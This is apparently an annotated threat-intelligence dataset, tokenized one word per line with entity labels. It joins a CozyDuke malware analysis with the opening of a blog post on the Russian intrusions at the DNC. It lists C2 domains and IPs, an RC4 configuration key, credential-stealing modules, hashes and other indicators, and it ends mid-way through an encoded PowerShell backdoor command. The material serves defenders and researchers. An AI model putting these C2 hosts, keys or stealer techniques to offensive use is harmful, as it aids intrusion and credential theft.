446daabb7ac2b9f11dc1267fbd192628cc2bac19  B_hash
87668d14910c1e1bb8bbea0c6363f76e664dcd09  B_hash
87668d14910c1e1bb8bbea0c6363f76e664dcd09  B_hash
ea0cfe60a7b7168c42c0e86e15feb5b0c9674029  B_hash
f2ffc4e1d5faec0b7c03a233524bb78e44f0e50b  B_hash
9b56155b82f14000f0ec027f29ff20e6ae5205c2  B_hash
9b56155b82f14000f0ec027f29ff20e6ae5205c2  B_hash
bf265227f9a8e22ea1c0035ac4d2449ceed43e2b  B_hash
32b0c8c46f8baaba0159967c5602f58dd73ebde9  B_hash
78e9960cc5819583fb98fb619b33bff7768ee861  B_hash
78e9960cc5819583fb98fb619b33bff7768ee861  B_hash
ce9d077349638ffd3e1ad68cda76c12cfb024069  B_hash
ac2b5928f46069111f4334f650a7dbf1b5f026d5  B_hash
ac2b5928f46069111f4334f650a7dbf1b5f026d5  B_hash
bf9d3a45273608caf90084c1157de2074322a230  B_hash

Note
:
Domain
names
intentionally
broken

HTTP

HTTP

HTTP

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS

HTTPS
www.sanjosemaristas.com B_url.distribute
/app/index.php
www.cifss.org B_url.distribute
pvt.relance.fr
200.119.128.45  B_ip.distribute
202.206.232.20  B_ip.distribute
/product_thumb/index.php
/catalogue/json/index.php
/mobile.php
/rss.php
www.getiton.hants.org.uk  B_url.distribute
/themes/front/img/ajax.php
www.seccionpolitica.com.ar  B_url.distribute
/galeria/index.php
200.125.133.28  B_ip.distribute
200.125.142.11  B_ip.distribute
203.156.161.49  B_ip.distribute
209.40.72.2 B_ip.distribute
210.59.2.20 B_ip.distribute
121.193.130.170 B_ip.distribute
208.75.241.246  B_ip.distribute
183.78.169.5  B_ip.distribute
201.76.51.10  B_ip.distribute
208.77.177.24 B_ip.distribute
/search.php
/news.php
/plugins/twitter.php
/plugins/fsearch.php
/search.php
/wp-ajax.php
/msearch.php
/search.php
/plugins/json.php
/fsearch.php

Port

In
all
CozyDuke  B_malware.drop
samples
from
2015
,
the
configuration
data
has
been
encrypted
with
the
RC4
key
B5
78
62
52
98
3E
24
D7
3B
C6
EE
7C
B9
ED
91
62
.
In
CozyDuke  B_malware.drop
samples
from
July
of
2014
,
the
RC4
key
has
been
embedded
in
the
encrypted
configuration
file
.

In
this
case
,
the
encrypted
configuration
file
will
begin
with
a
4-byte
value
specifying
the
length
of
the
included
RC4
key
.

This
will
be
followed
by
the
actual
key
.

Finally
,
the
rest
of
the
file
will
be
the
actual
configuration
data
.

Command
and
control
communication

CozyDuke's  B_malware.drop
main
method
of
communicating
with
its
command
and
control
server
is
using
either
HTTP
or

HTTPS
.

The
method
of
communication
,
as
well
as
the
address
to
connect
to
,
are
specified
in
CozyDuke's  B_malware.drop
configuration
data
.
In
the
cases
we
have
observed
,
the
configuration
data
for
any
single
CozyDuke  B_malware.drop
instance
has
included
the
details
of
either
one
or
two
C&C
servers
.

Listed
above
are
details
of
known
CozyDuke  B_malware.drop
C&C
servers
.

We
believe
all
of
the
ones
listed
are
compromised
servers
.

In
addition
to
its
main
communication
method
,

CozyDuke  B_malware.drop
also
features
the
ability
to
use
Twitter
as
a
backup
C&C
channel
.

In
cases
where
CozyDuke  B_malware.drop
utilizes
this
functionality
,
the
twitter
account
to
be
used
will
be
specified
in
CozyDuke's  B_malware.drop
configuration
data
.

We
have
only
observed
two
samples
where
a
backup
Twitter
account
was
actually
specified
in
the
configuration
data
.
These
accounts
were
@US2515
and
@monkey_drive
.

Tasks

CozyDuke's  B_malware.drop
primary
purpose
is
the
execution
of
tasks
.

These
tasks
usually
involve
the
execution
of
modules
or
executables
providing
additional
functionality
.

The
main
difference
between
the
two
is
that
modules
are
DLL
files
loaded
in
memory
by
the
CozyDuke  B_malware.drop
main
component
,
whereas
executables
are
PE
executable
files
that

CozyDuke  B_malware.drop
will
write
to
disk
and
execute
.

For
the
purpose
of
managing
tasks
,
the
main
component
of
CozyDuke  B_malware.drop
implements
6
commands
that
the
C&C
server
can
specify
.

These
commands
are
briefly
described
in
Table
2
(
overleaf
)
.

REFERENCE

I
.
GData;
Paul
Rascagneres;
COM
Object
hijacking
:
the
discreet
way
of
persistence
:
An
Analysis
of
a
new
persistence
mechanism
in
the
wild;
published
30.10.2014;
https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html

CozyDuke  B_malware.drop
Malware
analysis
6

TABLE
2
:
6
CozyDuke  B_malware.drop

C&C
SERVER
COMMANDS

Command

Delete

Stop

Modify

Upload

Download

Purpose

Add
task

Delete
task

Stop
task

Modify
task
or
configuration

Upload
data

Download
data

The
following
chapter
,
CozyDuke  B_malware.drop
Tasks
,
provides
further
information
on
the
tasks
CozyDuke  B_malware.drop
has
been
observed
executing
.

CozyDuke  B_malware.drop
TASKS

Based
on
samples
obtained
from
our
own
collections
and
generously
shared
to
us
by
a
trusted
source
,
we
have
been
able
to
identify
some
of
the
tasks
executed
recently
by
CozyDuke  B_malware.drop
.

These
tasks
can
be
divided
into
two
categories
.

The
first
consists
of
CozyDuke  B_malware.drop
modules
which
are
DLL
files
loaded
in
memory
by
the
main
component
of
CozyDuke  B_malware.drop
for
the
purposes
of
extending

CozyDuke's  B_malware.drop
functionality
.

The
second
category
consists
of
PE
executable
files
that
CozyDuke  B_malware.drop
will
write
to
disk
and
execute
on
the
infected
host
.

These
executables
are
usually
droppers
similar
to
those
used
to
infect
a
host
with
CozyDuke  B_malware.drop
.

In
this
case
,
however
,
instead
of
dropping

CozyDuke  B_malware.drop
,
the
executables
may
drop
other
executables
,
scripts
or
DLLs
.
Once
executed
by
CozyDuke  B_malware.drop
,
these
executables
function
independently
of
CozyDuke's  B_malware.drop
main
component
.

Modules

Listed
below
are
the
modules
we
have
observed
being
used
:

TABLE
3
:
CozyDuke  B_malware.drop
MODULES

Module
Type

Command
execution
module

Password
stealer
module

NTLM
stealer
module

System
info
module

Screenshot
module

Purpose

Can
be
used
to
execute
arbitrary
commands
by
invoking
C:\

Windows\System32\cmd.exe

Will
attempt
to
harvest
stored
credentials
from
the
victim

Will
attempt
to
harvest
credentials
stored
on
the
victim
host
that
are
used
as
part
of
Windows
NTLM
user
authentication

Will
attempt
to
gather
comprehensive
information
on
the
victim
host's
configuration

Will
take
a
screenshot
of
the
victim
host

Executables

We
have
observed
executables
executed
by
CozyDuke  B_malware.drop
for
the
following
purposes
:
•
Dropping
and
executing
scripts
for
collecting
information
and
credentials
from
the
victim
organization's
Active
Directory
environment
•
Dropping
and
executing
scripts
for
further
penetrating
the
victim
organization
with
the
help
of
commonly
available
tools
such
as
Mimikatz
and

PSExec
•
Dropping
and
executing
additional
malware
with
the
same
file
and
export
naming
conventions
as
OnionDuke
and
the
same
string
encryption
algorithm
as
OnionDuke

These
executables
will
implement
their
own
methods
of

C&C
communication
and
data
exfiltration
.

In
many
cases
,
the
scripts
utilized
Microsoft
OneDrive
accounts
for
data
transfer
.

CozyDuke  B_malware.drop
EVOLUTION

The
earliest
CozyDuke  B_malware.drop
sample
we
have
observed
so
far
was
compiled
on
the
29th
of
December
,
2011
.
The
sample
in
question
was
not
an
actual
CozyDuke  B_malware.drop
main
component
,
but
a
CozyDuke  B_malware.drop
module
.
The
earliest
main
component
we
observed
was
compiled
on
the
29th
of
February
,
2012
.

The
main
component
in
question
stores
its
strings
and
configuration
in
an
unencrypted
form
.

Additionally
,
the
configuration
is
stored
embedded
in
the
binary
,
not
as
a
separate
XML
file
in
the
manner
of
newer
CozyDuke  B_malware.drop
versions
.

Even
this
oldest
main
component
does
however
use
XML
for
other
purposes
via
the
open-source
Pugi-XML
library
.

The
next
CozyDuke  B_malware.drop
main
component
we
observed
was
compiled
on
the
30th
of
November
,
2012
.

By
then
,
the
authors
had
switched
to
encrypting
the
strings
and
the
configuration
.

However
,
the
configuration
was
still
stored
embedded
in
the
binary
.

Design-wise
,
this
sample
is
a
bit
of
an
outlier
.

Instead
of
being
a
DLL
file
,
the
main
component
is
actually
an
EXE
that
,
in
addition
to
the
configuration
,
embeds
multiple
DLLs
that
provide
additional
functionality
to
the
main
component
.

Apart
from
the
different
design
,
functionally
the
main
component
is
very
similar
to
other
CozyDuke  B_malware.drop
main
components
.

It
is
possible
the
authors
of
CozyDuke  B_malware.drop
were
trying
out
a
new
design
,
but
eventually
decided
to
go
back
to
the
original
.

The
next
CozyDuke  B_malware.drop
main
component
we
observed
,
compiled
on
the
2nd
of
July
,
2014
,
is
again
a
DLL
file
.

By
now
,
the
authors
of
CozyDuke  B_malware.drop
had
switched
from

CozyDuke  B_malware.drop
Malware
analysis
FIGURE
4
:
TIMELINE
OF
CozyDuke  B_malware.drop
EVOLUTION

Executable
CozyDuke  B_malware.drop
main
component
30/11/12
426KB
EXE

Encrypted
strings
29/12/11

Oldest
known
CozyDuke  B_malware.drop
module

Unencrypted
strings

Encrypted
embedded
configuration
26/2/15

CozyDuke  B_malware.drop
main
component
820KB
DLL

Encrypted
strings

Encrypted
external
configuration
2012
2013
2014
2015

Oldest
known
CozyDuke  B_malware.drop
main
module
29/2/12
266KB
DLL

Unencrypted
strings

Unencrypted
embedded
configuration
an
embedded
configuration
to
the
external
XMLformatted
configuration
file
seen
today
.

We
have
yet
to
observe
samples
from
2013
,
but
we
believe
CozyDuke  B_malware.drop
to
have
been
under
active
development
as
well
during
that
year
.

Between
2012
and
2014
,
the
authors
of
CozyDuke  B_malware.drop
appear
to
have
performed
significant
refactoring
of
the
CozyDuke  B_malware.drop
codebase
,
even
though
functionally
the
differences
are
smaller
.

Examples
of
this
refactoring
include
for
instance
the
switch
from
using
the
Pugi-XML
library
to
using
Microsoft's
MSXML
3.0
for
XML-related
functionality
.

The
latest
CozyDuke  B_malware.drop
main
component
we
observed
was
compiled
on
the
26th
of
February
,
2015
.

The
core
functionality
of
the
latest
sample
is
very
similar
to
the
previous
sample
from
July
of
2014
,
but
the
authors
of
CozyDuke  B_malware.drop
have
implemented
a
lot
of
additional
functionality
,
as
the
increase
in
size
from
279KB
to
820KB
would
also
suggest
.

2/7/14

CozyDuke  B_malware.drop
main
component
279KB
DLL

Encrypted
strings

Encrypted
external
configuration

CozyDuke  B_malware.drop
TERMINOLOGY
AND
NAMING

Based
on
logging
strings
,
variable
naming
and
PDB
strings
found
in
CozyDuke  B_malware.drop
samples
,
we
observed
the
following
:
•
The
internal
name
for
CozyDuke  B_malware.drop
is
'
Agent
'
•
The
CozyDuke  B_malware.drop
main
component's
functionality
revolves
around
the
execution
of
'
tasks
'
that
are
often
associated
with
'
modules
'

It
is
possible
that
the
name
'
Agent
'
is
not
the
original
internal
name
of
CozyDuke  B_malware.drop
and
that
the
name
was
changed
sometime
in
2011
with
the
original
project
name
being
'
Agent_NextGen
'
•
Sometime
in
2011
,
CozyDuke  B_malware.drop
was
identified
internally
as
being
version
3

PDB
strings
found
in
early
CozyDuke  B_malware.drop
samples
are
listed
in

Table
4
(
below
)
.

TABLE
4
:
CozyDuke  B_malware.drop
PDB
STRINGS

Compilation
timestamp
PDB
string

Mon
Feb
13
13:07:04
2012
(
UTC
)

Wed
Dec
28
13:23:04
2011
(
UTC
)

Thu
Jan
26
13:57:00
2012
(
UTC
)

E:\Visual
Studio
2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\tasks\bin\

GetPasswords\exe\GetPasswords.pdb

D:\Projects\Agent2011\Agent2011\Agent\tasks\bin\systeminfo\exe\systeminfo.pdb
\\192.168.56.101\true\soft\Agent\tasks\Screenshots\agent_screeshots\Release\agent_
screeshots.pdb

CozyDuke  B_malware.drop
Malware
analysis
8

APPENDIX
A
|
SAMPLE
HASHES
•
00f67deb6e435c68f8a39336c9effc45d395b134  B_hash
•
01d3973e1bb46e2b75034736991c567862a11263  B_hash
•
034481acd945028f4521cf0eaa3685c6202f9e19  B_hash
•
04aefbf1527536159d72d20dea907cbd080793e3  B_hash
•
08facf0ae484f5bc7b066bbdd382e683fdfcba77  B_hash
•
0a38765d599865dabc394287e61f5e8f6ac442c5  B_hash
•
1051f814b33991a1f8e551759ead44b8ee7fc2c9  B_hash
•
1a3825ef1064c2bbea5169671ef62030b00875ca  B_hash
•
1d734a26184005603605aab67eba76d7d5ec3b8c  B_hash
•
1e02eea130d17b9afb712d846612ab8bd6972183  B_hash
•
210bc99275368df7ea179055737cffc3a12a6614  B_hash
•
23e20c523b9970686d913360d438c88e6067c157  B_hash
•
2564d7d42384bd3dce7257ef4a0a4b0cedac635b  B_hash
•
259b4679c26625c452141861014fe2f2c336462b  B_hash
•
26d030c93c517d63147f502bf6536c3914698821  B_hash
•
29686320a3f06030f7192ca5b4f3eb47e73cb470  B_hash
•
29a91e7823046f4ec3fd6b3fd1b442eaa92f3565  B_hash
•
31163d35c5a3caa5e82e1d9b0d1b4db8fbdd79fa  B_hash
•
32b0c8c46f8baaba0159967c5602f58dd73ebde9  B_hash
•
33beb7a410f1cd699733000b5b30b5e4eb2062ba  B_hash
•
3583647ef8158e29e3c18413ece70c2851720926  B_hash
•
365cbfe32a79ce41b049dd85bb30afc51ba1ea6f  B_hash
•
37144694cfa953ab7acd376c033beda45cc95f4d  B_hash
•
3a624b196576b03d327b43247a975da44688ffda  B_hash
•
3b297f0ca7750c0c74e5f931fec1528fe1ba6bc9  B_hash
•
3c8ba7ca3675ecc75855a58b9c0527d067c88f86  B_hash
•
3f0be1751afa9cb0fdd6bc6fc9874dd880bc8c1b  B_hash
•
41bb403d2549db95cfc6c851ef92ad26bdf2e906  B_hash
•
42cfe068b0f476198b93393840d400424fd77f0c  B_hash
•
42fadc443025a132f833a4a5ed8a5350f79a86cc  B_hash
•
43a979aa6ab08685d9ce949c67e19bebbb3c3559  B_hash
•
443bc2e77b10ae64af6321c2c7bfd311c0772503  B_hash
•
44406a80f13045442ce6a28ee62a923ac8f8c56a  B_hash
•
482d1624f9450ca1c99926ceec2606260e7ce544  B_hash
•
4975293c49ca223013088e51b8378e935322fe93  B_hash
•
49fb759d133eeaab3fcc78cec64418e44ed649ab  B_hash
•
4a16674c799fae6535c82f878f6a37f94ee9a49b  B_hash
•
5150174a4d5e5bb0bccc568e82dbb86406487510  B_hash
•
55bd71353408cdda1bdbbd54bc70b4c595d70e56  B_hash
•
56ac317ed78f8016d59cb41e9283b1c08cbf149f  B_hash
•
5bcd74e0c3c661580201e7d8122d7525a1480b4c  B_hash
•
5d3b82cdea4ae066efd5d127c7dd222adee62d0b  B_hash
•
5d4535df615a30b87b57facf4babf8d506e86a07  B_hash
•
5ffe420a3cc848024884db8e2cfed68c47368dae  B_hash
•
6502bffbd1324071c7461c50a2552e48084560ae  B_hash
•
662d3cb303450abae2b88699c7f48d74f84f0d5a  B_hash
•
669b7c98f0f697b91e95804dacdfe55fae3f0a85  B_hash
•
69c82f6ca382bd2205d55b89f2e842b4790bda62  B_hash
•
6b5ef7b76b35203dd323af49bfa27cfa7e1b6376  B_hash
•
6b64ed0f4e39a1c320c7cbd342a93faed9f5df86  B_hash
•
71c59eaa445346251467942bac489a9d4e807f7f  B_hash
•
75aeaee253b5c8ae701195e3b0f49308f3d1d932  B_hash
•
75e03a17d49d1b052770a21520bc13b14fc6c607  B_hash
•
7765a0869530c1a17b8fd339bbe55cc4c1bdba30  B_hash
•
78e9960cc5819583fb98fb619b33bff7768ee861  B_hash
•
7c710cf31f20ef7e0ad1809672255d4edfdff052  B_hash
•
7c79e3205323b9917f9eedcd3d5a891d87ddf256  B_hash
•
7cda99eefb5150b87278f9bcf6ac0bde534b99e8  B_hash
•
80935ac2ab3cf5b2900b49f6982a6a3f4575367c  B_hash
•
81affba765aa87a0d0b12b5a213f09fd51e1e9a1  B_hash
•
87668d14910c1e1bb8bbea0c6363f76e664dcd09  B_hash
•
883292f00e5836f99a1943a6e0164d8c6c124478  B_hash
•
8ad2003b99d92dfb9d85912ee6a39c46b1ec8137  B_hash
•
8b357ff017df3ed882b278d0dbbdf129235d123d  B_hash
•
8ba7932a40008881a4ed975f52271c0b679eaff2  B_hash
•
8bc2d5aa1f384d56f3e921bce5326de8ff4dce2d  B_hash
•
8c3ed0bbdc77aec299c77f666c21659840f5ce23  B_hash
•
8cc326473fd30ab5c97709e5a91fb04e18e72e96  B_hash
•
8f1ac45360196a7b5a1680ff839a131394e9d9b4  B_hash
•
8f467b32f1ec0f3b2efe10b3fed2a14b16075702  B_hash
•
9319bf72000f8e468c182947dd5c82fb8b9ae419  B_hash
•
93d53be2c3e7961bc01e0bfa5065a2390305268c  B_hash
•
93ee1c714fad9cc1bf2cba19f3de9d1e83c665e2  B_hash
•
94520b93510db0dc10387a65e0a46f45ab501226  B_hash
•
975b86c329c537f763f94a3f12610304dd358ff8  B_hash
•
9b56155b82f14000f0ec027f29ff20e6ae5205c2  B_hash
•
9dc6bbc34933ffecbfbb454788bab4230fcc2c65  B_hash
•
9e156f41ff9c17692c9eba5bdb67ac14f0c0473f  B_hash
•
9f8f1672594a6fbac43793c857dd7718e75f328a  B_hash
•
a38ea2533e3dfa6339726aafd4bc2bc7e3eec529  B_hash
•
a7a00f35797db2db9302625be456671911896d27  B_hash
•
a99d8313876015fcf1b783d38fee9e9c3cde088c  B_hash
•
ac2b5928f46069111f4334f650a7dbf1b5f026d5  B_hash
•
b26bc0a3e35c474f7099bd2b066f1680f3394b14  B_hash
•
b2b2e5c5a6f8a07f051aab14fbec1f6607888b50  B_hash
•
b47e711845d03c389004c912b3fbfc59228bb18c  B_hash
•
b5e973df0a159ab583fc8923c796c8cbf5b535df  B_hash
•
ba29768a2452a0e3abde02a903e53a181ee05bc8  B_hash
•
bdd2bae83c3bab9ba0c199492fe57e70c6425dd3  B_hash
•
bf265227f9a8e22ea1c0035ac4d2449ceed43e2b  B_hash
•
bf9d3a45273608caf90084c1157de2074322a230  B_hash
•
c02b8c2bc15dd8a7110e5f1765716464bf421591  B_hash
•
c117608dab3ab632de8110f8981dd7e773c61d05  B_hash
•
c3d8a548fa0525e1e55aa592e14303fc6964d28d  B_hash
•
c3fde950fe7d668805b40b1680d519f20c18b899  B_hash
•
c5ef4c31693845d492285e5f1c7ff3c293f99976  B_hash
•
c62e840ffe4bba50f6584b33a877475f0ebcf558  B_hash
•
c6472898e9085e563cd56baeb6b6e21928c5486d  B_hash
•
c7b91ff3cc69dab807016aa76d0c261411ccf27d  B_hash
•
c8fe2296565c211e019cdad3918a5736d4b12d44  B_hash
•
caa1083d2f20be0858e8d3d0671c042d0455a657  B_hash
•
cb7652aede9b1b7d756019f44c25fb0263498313  B_hash
•
ccf83cd713e0f078697f9e842a06d624f8b9757e  B_hash
•
ce9d077349638ffd3e1ad68cda76c12cfb024069  B_hash
•
cebcf2f495c3b95138128d0577dcac5cde29490d  B_hash
•
d12e4f164a4734e8136da85001750157014d012c  B_hash
•
d3254f1f4c4def8c023982dfb28fa31e91b69ab5  B_hash
•
d5cbf554e4e700b37ddcb026d4407fcd87032d87  B_hash
•
d89fc09f1aa72547d4b7f022470b6c8362997a5f  B_hash
•
daa651188610fd9c5a6987109e7ee5504d72a35d  B_hash
•
e0779ac6e5cc76e91fca71efeade2a5d7f099c80  B_hash
•
e2d0edf2e7d4a09fad732d4113d970a56e9a6667  B_hash
•
e76da232ec020d133530fdd52ffcc38b7c1d7662  B_hash
•
e99a03ebe3462d2399f1b819f48384f6714dcba1  B_hash
•
ea0cfe60a7b7168c42c0e86e15feb5b0c9674029  B_hash
•
eb851adfada7b40fc4f6c0ae348694500f878493  B_hash
•
efd41300ccf4143d04664715e1de98cb416ffdd1  B_hash
•
f2ffc4e1d5faec0b7c03a233524bb78e44f0e50b  B_hash
•
f33c980d4b6aaab1dc401226ab452ce840ad4f40  B_hash
•
f38040c70024fe9e305af5a3687e0d5993bb9e96  B_hash
•
f7693e5d39db067d97cd91fb22522f94c59fda3d  B_hash
•
f7d47c38eca7ec68aa478c06b1ba983d9bf02e15  B_hash
•
fb1b1dc288d68f695f88c5ac036b3ab1c4f5e850  B_hash
•
feb9424386af47d550b13614c78530bc06ec876e  B_hash

APPENDIX
A
9

User
agent
strings
•
Java/1.8.0_25
•
Java/1.8.0_26
•
Mozilla/5.0
(
Windows
NT
6.1;
WOW64;
Trident/7.0;
iTunes/12.0.1
(
Windows;
N
)
rv:11.0
)
like
Gecko
•
Mozilla/5.0
(
Windows
NT
6.1;
WOW64;
rv:32.0
)

Gecko/20100101
Firefox/32.0
•
Mozilla/5.0
(
Windows
NT
6.1;
WOW64
)

AppleWebKit/537.36
(
KHTML
,
like
Gecko
)
Chrome
/34.0.1847.137
Safari/537.36

Mutexes
•
Mtx
•
qdfrty
•
AgentMutex

APPENDIX
B
:
IOCS

Filenames
(
Note
:
we
believe
many
of
these
to
be
borrowed
from
legitimate
files
)
agent_wininet_dl.exe
•
amdh264enc32.bin
•
amdh264enc32.dll
•
amdhcp32.dll
•
amdhdl32.dll
•
amdmftdecoder_32.dll
•
amdmftvideodecoder_32.bin
•
amdmftvideodecoder_32.dll
•
amdmiracast.dll
•
amdocl_as32.exe
•
amdocl.bin
•
amdocl_ld32.exe
•
amd_opencl32.dll
•
amdpcom32.bin
•
atiadlxx.bin
•
atiadlxx.dll
•
atiapfxx.exe
•
atibtmon.exe
•
aticalcl.dll
•
aticaldd.dll
•
aticalrt.dll
•
aticfx32.bin
•
aticfx32.dll
•
atidemgy.bin
•
atidxx32.bin
•
atidxx32.dll
•
atieclxx.exe
•
atiesrxx.exe
•
atiglpxx.dll
•
atiicdxx.dat
•
atikmdag.sys
•
atimuixx.dll
•
atiodcli.exe
•
atiode.exe
•
atioglxx.bin
•
atisamu32.dll
•
atiu9pag.bin
•
atiuxpag.dll
•
ativce02.dat
•
ativvaxy_cik.dat
•
ativvaxy_cik_nd.dat
•
ativvsva.dat
•
ativvsvl.dat
•
autorun.dll
•
autorun_com.dll
•
autorun_curver.dll
•
clinfo.exe
•
coinst_13.152.dll
•
observers.dll
•
ovdecode.dll
•
wininetp.dll

APPENDIX
B
Bears
in
the
Midst
:
Intrusion
into
the
Democratic
National
Committee
crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/ B_url.normal
Dmitri
Alperovitch
There
is
rarely
a
dull
day
at
CrowdStrike
where
we
are
not
detecting
or
responding
to
a
breach
at
a
company
somewhere
around
the
globe
.

In
all
of
these
cases
,
we
operate
under
strict
confidentiality
rules
with
our
customers
and
can
not
reveal
publicly
any
information
about
these
attacks
.

But
on
rare
occasions
,
a
customer
decides
to
go
public
with
information
about
their
incident
and
give
us
permission
to
share
our
knowledge
of
the
adversary
tradecraft
with
the
broader
community
and
help
protect
even
those
who
do
not
happen
to
be
our
customers
.

This
story
is
about
one
of
those
cases
.

CrowdStrike
Services
Inc.
,
our
Incident
Response
group
,
was
called
by
the
Democratic
National
Committee
(
DNC
)
,
the
formal
governing
body
for
the
US
Democratic
Party
,
to
respond
to
a
suspected
breach
.

We
deployed
our
IR
team
and
technology
and
immediately
identified
two
sophisticated
adversaries
on
the
network
–
COZY
BEAR
and
FANCY
BEAR
.

We
've
had
lots
of
experience
with
both
of
these
actors
attempting
to
target
our
customers
in
the
past
and
know
them
well
.

In
fact
,
our
team
considers
them
some
of
the
best
adversaries
out
of
all
the
numerous
nation-state
,
criminal
and
hacktivist
/
terrorist
groups
we
encounter
on
a
daily
basis
.

Their
tradecraft
is
superb
,
operational
security
second
to
none
and
the
extensive
usage
of
'
living-off-the-land
'
techniques
enables
them
to
easily
bypass
many
security
solutions
they
encounter
.

In
particular
,
we
identified
advanced
methods
consistent
with
nation-state
level
capabilities
including
deliberate
targeting
and
'
access
management
'
tradecraft
–
both
groups
were
constantly
going
back
into
the
environment
to
change
out
their
implants
,
modify
persistent
methods
,
move
to
new
Command
&
Control
channels
and
perform
other
tasks
to
try
to
stay
ahead
of
being
detected
.

Both
adversaries
engage
in
extensive
political
and
economic
espionage
for
the
benefit
of
the
government
of
the
Russian
Federation
and
are
believed
to
be
closely
linked
to
the
Russian
government
's
powerful
and
highly
capable
intelligence
services
.

COZY
BEAR
(
also
referred
to
in
some
industry
reports
as
CozyDuke B_malware.backdoor
or
APT
29
)
is
the
adversary
group
that
last
year
successfully
infiltrated
the
unclassified
networks
of
the
White
House
,
State
Department
,
and
US
Joint
Chiefs
of
Staff
.

In
addition
to
the
US
government
,
they
have
targeted
organizations
across
the
Defense
,
Energy
,
Extractive
,
Financial
,
Insurance
,
Legal
,
Manufacturing
Media
,
Think
Tanks
,
Pharmaceutical
,
Research
and
Technology
industries
,
along
with
Universities
.

Victims
have
also
been
observed
in
Western
Europe
,
Brazil
,
China
,
Japan
,
Mexico
,
New
Zealand
,
South
Korea
,
Turkey
and
Central
Asian
countries
.

COZY
BEAR
's
preferred
intrusion
method
is
a
broadly
targeted
spearphish
campaign
that
typically
includes
web
links
to
a
malicious
dropper
.

Once
executed
on
the
machine
,
the
code
will
deliver
one
of
a
number
of
sophisticated
Remote
Access
Tools
(
RATs B_malware.infosteal
)
,
including
AdobeARM
,
ATI-Agent
,
and
MiniDionis B_malware.unknown
.

On
many
occasions
,
both
the
dropper
and
the
payload
will
contain
a
range
of
techniques
to
ensure
the
sample
is
not
being
analyzed
on
a
virtual
machine
,
using
a
debugger
,
or
located
within
a
sandbox
.

They
have
extensive
checks
for
the
various
security
software
that
is
installed
on
the
system
and
their
specific
configurations
.

When
specific
versions
are
discovered
that
may
cause
issues
for
the
RAT B_malware.infosteal
,
it
promptly
exits
.

These
actions
demonstrate
a
well-resourced
adversary
with
a
thorough
implant-testing
regime
that
is
highly
attuned
to
slight
configuration
issues
that
may
result
in
their
detection
,
and
which
would
cause
them
to
deploy
a
different
tool
instead
.

The
implants
are
highly
configurable
via
encrypted
configuration
files
,
which
allow
the
adversary
to
customize
various
components
,
including
C2
servers
,
the
list
of
initial
tasks
to
carry
out
,
persistence
mechanisms
,
encryption
keys
and
others
.

An
HTTP
protocol
with
encrypted
payload
is
used
for
the
Command
&
Control
communication
.

FANCY
BEAR
(
also
known
as
Sofacy
or
APT
28
)
is
a
separate
Russian-based
threat
actor
,
which
has
been
active
since
mid
2000s
,
and
has
been
responsible
for
targeted
intrusion
campaigns
against
the
Aerospace
,
Defense
,
Energy
,
Government
and
Media
sectors
.

Their
victims
have
been
identified
in
the
United
States
,
Western
Europe
,
Brazil
,
Canada
,
China
,
Georgia
,
Iran
,
Japan
,
Malaysia
and
South
Korea
.

Extensive
targeting
of
defense
ministries
and
other
military
victims
has
been
observed
,
the
profile
of
which
closely
mirrors
the
strategic
interests
of
the
Russian
government
,
and
may
indicate
affiliation
with
Главное
Разведывательное
Управление
(
Main
Intelligence
Department
)
or
GRU
,
Russia
's
premier
military
intelligence
service
.

This
adversary
has
a
wide
range
of
implants
at
their
disposal
,
which
have
been
developed
over
the
course
of
many
years
and
include
Sofacy
,
X-Agent B_malware.infosteal
,
X-Tunnel B_malware.unknown
,
WinIDS B_malware.unknown
,
Foozer B_malware.unknown
and
DownRange B_malware.drop
droppers
,
and
even
malware
for
Linux
,
OSX
,
IOS
,
Android
and
Windows
Phones
.

This
group
is
known
for
its
technique
of
registering
domains
that
closely
resemble
domains
of
legitimate
organizations
they
plan
to
target
.

Afterwards
,
they
establish
phishing
sites
on
these
domains
that
spoof
the
look
and
feel
of
the
victim
's
web-based
email
services
in
order
to
steal
their
credentials
.

FANCY
BEAR
has
also
been
linked
publicly
to
intrusions
into
the
German
Bundestag
and
France
's
TV5
Monde
TV
station
in
April
2015
.

At
DNC
,
COZY
BEAR
intrusion
has
been
identified
going
back
to
summer
of
2015
,
while
FANCY
BEAR
separately
breached
the
network
in
April
2016
.

We
have
identified
no
collaboration
between
the
two
actors
,
or
even
an
awareness
of
one
by
the
other
.

Instead
,
we
observed
the
two
Russian
espionage
groups
compromise
the
same
systems
and
engage
separately
in
the
theft
of
identical
credentials
.

While
you
would
virtually
never
see
Western
intelligence
agencies
going
after
the
same
target
without
de-confliction
for
fear
of
compromising
each
other
's
operations
,
in
Russia
this
is
not
an
uncommon
scenario
.

'
Putin
's
Hydra
:
Inside
Russia
's
Intelligence
Services
'
,
a
recent
paper
from
European
Council
on
Foreign
Relations
,
does
an
excellent
job
outlining
the
highly
adversarial
relationship
between
Russia
's
main
intelligence
services
–
Федеральная
Служба
Безопасности
(
FSB
)
,
the
primary
domestic
intelligence
agency
but
one
with
also
significant
external
collection
and
'
active
measures
'
remit
,
Служба
Внешней
Разведки
(
SVR
)
,
the
primary
foreign
intelligence
agency
,
and
the
aforementioned
GRU
.

Not
only
do
they
have
overlapping
areas
of
responsibility
,
but
also
rarely
share
intelligence
and
even
occasionally
steal
sources
from
each
other
and
compromise
operations
.

Thus
,
it
is
not
surprising
to
see
them
engage
in
intrusions
against
the
same
victim
,
even
when
it
may
be
a
waste
of
resources
and
lead
to
the
discovery
and
potential
compromise
of
mutual
operations
.

The
COZY
BEAR
intrusion
relied
primarily
on
the
SeaDaddy B_malware.backdoor
implant
developed
in
Python
and
compiled
with
py2exe
and
another
Powershell
backdoor
with
persistence
accomplished
via
Windows
Management
Instrumentation
(
WMI
)
system
,
which
allowed
the
adversary
to
launch
malicious
code
automatically
after
a
specified
period
of
system
uptime
or
on
a
specific
schedule
.

The
Powershell
backdoor
is
ingenious
in
its
simplicity
and
power
.

It
consists
of
a
single
obfuscated
command
setup
to
run
persistently
,
such
as
:
powershell.exe
-
NonInteractive
-
ExecutionPolicy
Bypass
-
EncodedCommand
1/3
